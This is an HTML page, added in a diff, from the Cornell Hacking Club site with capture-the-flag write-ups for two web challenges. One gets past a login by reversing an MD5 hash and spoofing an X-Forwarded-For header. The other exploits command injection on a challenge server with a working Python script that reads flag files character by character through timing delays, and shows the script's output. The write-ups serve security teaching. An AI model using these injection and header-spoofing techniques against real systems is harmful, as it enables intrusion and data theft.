@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Cornell Hacking Club</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="static/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="static/css/modern-business.css" rel="stylesheet">
+    <link href="static/css/general.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="static/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<!-- Navigation -->
+<nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse"
+                    data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="../">Cornell Hacking Club</a>
+        </div>
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="../about">About</a>
+                </li>
+                <!--{#                <li>#}-->
+                <!--{#                    <a href="../sponsorship">Sponsorship</a>#}-->
+                <!--{#                </li>#}-->
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Resources <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                        <li>
+                            <a href="../lectures">Lectures/Workshops</a>
+                        </li>
+                        <li>
+                            <a href=../writeups>Writeups</a>
+                        </li>
+                        <li>
+                            <a href="../guides">General Guides</a>
+                        </li>
+                        <li>
+                            <a href="../tools">Tools</a>
+                        </li>
+                    </ul>
+                </li>
+                <!--{#                <li>#}-->
+                <!--{#                    <a href="../contact">Contact</a>#}-->
+                <!--{#                </li>#}-->
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Other Pages <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                        <li>
+                            <a href="../faq">FAQ</a>
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+
+<!-- Page Content -->
+<div class="container">
+
+    <!-- Page Heading/Breadcrumbs -->
+    <div class="row">
+        <div class="col-lg-12">
+            <h1 class="page-header">IceCTF
+                </small>
+            </h1>
+            <ol class="breadcrumb">
+                <li><a href="../../">Home</a>
+                </li>
+                <li><a href="../">Writeups</a></li>
+                <li class="active">IceCTF</li>
+            </ol>
+        </div>
+    </div>
+    <!-- /.row -->
+
+    <!-- Content Row -->
+    <div class="row">
+
+        <div class="col-lg-12">
+
+            <hr>
+
+            <!-- Blog Post -->
+            <h1>Web100</h1>
+
+            <hr>
+
+            <!-- Date/Time -->
+            <p><i class="fa fa-clock-o"></i> Posted on February 13, 2017 at 9:45 AM</p>
+
+            <hr>
+
+            <p class="lead">Chris Martin wants to go home. Can you help him get there as soon as possible? http://54.152.19.210/web100/
+            </p>
+
+            <hr>
+
+            <p>The site is just a simple username and password protected login. One can assume that proper authentication will lead to the flag.</p>
+
+            <br/>
+
+            <p>The source code has a bash64 encoded hash as a comment and we can assume it is going to be useful. After decoding, we see a md5 hash.</p>
+            <br/>
+<pre><code>
+MmI0YjAzN2ZkMWYzMDM3NWU1Y2Q4NzE0NDhiNWI5NWM=
+Decoded: 2b4b037fd1f30375e5cd871448b5b95c
+</code></pre>
+
+            <br/>
+
+            <p>Googling the hash brings up very little, however, we find the xml files used by a radio station on a Google cached page from December 2016.</p>
+
+            <br/>
+
+<pre><code><xmp>
+<morceau id="6">
+    <date_prog><![CDATA[2016-12-08 06:49:03]]></date_prog>
+    <categorie><![CDATA[C1 VIR R]]></categorie>
+    <chanteur><![CDATA[COLDPLAY]]></chanteur>
+    <chanson><![CDATA[Paradise]]></chanson>
+    <pochette><![CDATA[http://covers.eg-ad.fr/coldplay-paradise.jpg]]></pochette>
+    <duration><![CDATA[]]></duration>
+    <artiste_id></artiste_id>
+    <title_id>2b4b037fd1f30375e5cd871448b5b95c</title_id>
+    <next><![CDATA[]]></next>
+    <artistnext><![CDATA[]]></artistnext>
+    <titlenext><![CDATA[La musique revient vite ...]]></titlenext>
+    <categorynext><![CDATA[]]></categorynext>
+    <imagenext><![CDATA[]]></imagenext>
+    <runtimenext><![CDATA[]]></runtimenext>
+</morceau>
+</xmp>
+</code></pre>
+
+            <br/>
+
+            <p>The hash is associated with the song Paradise by Coldplay. Given that our hint was about Chris Martin, we know we are on the right track. Playing around with an md5 hash calculator we find the hash is of 'coldplayparadise'.</p>
+
+             <br/>
+
+            <p>From this, we can assume our username is 'coldplay' and password is 'paradise' but we still aren't able to login. The nullcon twitter page tweeted a hint to the challenge by saying 'There's no place like home.' This is the famous quote which refers to the localhost ip address '127.0.0.1'. Adding a 'X-Forwarded-For' header pointing to localhost ends up doing the trick.</p>
+
+            <br/>
+
+            <h3><b>Flag:</b> flag{4f9361b0302d4c2f2eb1fc308587dfd6}</h3>
+
+        </div>
+
+
+        <!-- Blog Post Content Column -->
+        <div class="col-lg-12">
+
+            <hr>
+
+            <!-- Blog Post -->
+            <h1>Web300</h1>
+
+            <hr>
+
+            <!-- Date/Time -->
+            <p><i class="fa fa-clock-o"></i> Posted on February 13, 2017 at 9:45 AM</p>
+
+            <hr>
+
+            <p class="lead">http://54.89.146.217/
+            </p>
+
+            <hr>
+
+            <p>The challenge provides no hint, just a link to a website. Upon opening up the site you see the following
+                text: "At your service. Give me command with cmd, sir. You will get me. str(/home/nullcon/flagpart1.txt)
+                + str/home/nullcon/flagpart2"</p>
+
+            <br/>
+
+            <!-- Post Content -->
+            <p>The text on the site immediately suggests the site may be vulnerable to command injection. Further playing around proved that the site was injectable through a query parameter.</p>
+            <br/>
+<pre><code>
+http://54.89.146.217/?cmd=
+</code></pre>
+
+            <br/>
+
+            <p>We were able to get the server to sleep with the bash sleep command but were unable to send/receive any information to/from the server with the likes of netcat, telnet, wget, curl, etc. This led us to believe that a firewall was in place. As a result, we wrote a script to iterate through the ascii character set and sleep when the character in the flag text file was a match.</p>
+
+            <br/>
+
+<pre class="prettyprint">
+<code class="language-python">
+from requests.utils import quote
+import time
+import unirest
+from time import sleep
+import string
+
+SLEEP_TIME=1.5
+ans = 'flag{'
+characters = string.ascii_letters + string.digits
+
+for index in range(1, 100):
+	for letter in characters:
+		cmd = '''
+		python -c "__import__('time').sleep({} if open('/home/nullcon/flagpart1.txt').read({})[-1:] == '{}' else 0)"
+	  		'''.format(SLEEP_TIME, index, letter)
+
+		start = time.time()
+		response = unirest.get("http://54.89.146.217/?cmd={}".format(quote(cmd, safe='')))
+		end = time.time()
+		elapsed = end - start
+
+		if elapsed > SLEEP_TIME:
+			ans += letter
+			print ans + '}'
+			break
+</code>
+</pre>
+
+            <br/>
+
+            <p>While inefficient, the script was ultimately successful and produced the following output:</p>
+
+            <br/>
+
+<pre><code>
+flag{0}
+flag{0m}
+flag{0mg}
+flag{0mgt}
+flag{0mgth}
+flag{0mgth4}
+flag{0mgth4t}
+flag{0mgth4ts}
+</code></pre>
+
+            <br/>
+
+            <p>Switching the script to flagpart2.txt we get the remainder of the flag</p>
+
+            <br/>
+
+<pre><code>
+flag{a}
+flag{an}
+flag{ani}
+flag{anic}
+flag{anice}
+flag{anicef}
+flag{anicefl}
+flag{anicefla}
+flag{aniceflag}
+</code></pre>
+
+            <br/>
+
+            <h3><b>Flag:</b> flag{0mgth4tsaniceflag}</h3>
+
+
+        </div>
+
+
+    </div>
+
+
+    <!-- Writeup Content End-->
+
+
+    <!-- Footer -->
+    <footer>
+        <div class="row">
+            <div class="col-lg-12">
+                <p>Copyright &copy; Cornell Hacking Club 2016</p>
+            </div>
+        </div>
+    </footer>
+
+</div>
+<!-- /.container -->
+
+<!-- jQuery -->
+<script src="static/js/jquery.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="static/js/bootstrap.min.js"></script>
+
+<!-- Code Snippet Prettify -->
+<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js"></script>
+
+</body>
+
+</html>
